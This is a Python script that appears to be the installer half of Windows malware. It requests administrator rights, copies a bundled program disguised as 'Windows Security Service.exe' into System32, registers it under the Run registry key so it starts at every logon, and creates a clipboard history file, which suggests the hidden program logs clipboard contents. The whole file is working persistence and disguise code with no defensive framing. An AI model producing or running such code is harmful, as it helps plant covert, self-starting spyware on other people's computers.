import shutil
import os
import sys
import ctypes
import winreg
import sys


#Ask For Run As Administrator
def run_as_admin():
  
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)
        return False

if run_as_admin():
    def move_exe_file(source_path, destination_path):
        try:
            # Check if the source file exists
            if os.path.exists(source_path):
                # Move the file to the destination path
                shutil.move(source_path, destination_path)
                print(f"File moved successfully to {destination_path}")
            else:
                print(f"Source---**file {source_path} does not exist.")
                exit()
        except Exception as e:
            print(f"Error: {e}")

    # Get the directory of the script or the bundled executable
    script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))

    # Specify the paths
    source_file_path = os.path.join(script_directory, r"Windows Security Service.exe")
    destination_folder = r"C:\Windows\System32"

    move_exe_file(source_file_path, destination_folder)

    # #🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴 2nd Part

    def add_to_startup():

        # Get the path to the executable (assuming it's in the same directory)
        executable_path = os.path.abspath(r"C:\Windows\System32\Windows Security Service.exe")

        # Create the registry key for the startup entry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = r"Windows Security Service"

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
            print(f"Added to startup: {executable_path}")
        except Exception as e:
            print(f"Error adding to startup: {e}")

        

    # Add the executable to startup
    add_to_startup()
    # Extra Work
    HISTORY_FILE = r"C:\Users\clipboard_history.txt"
    with open(HISTORY_FILE, "w") as file:
        file.write("\n")
    sys.exit()


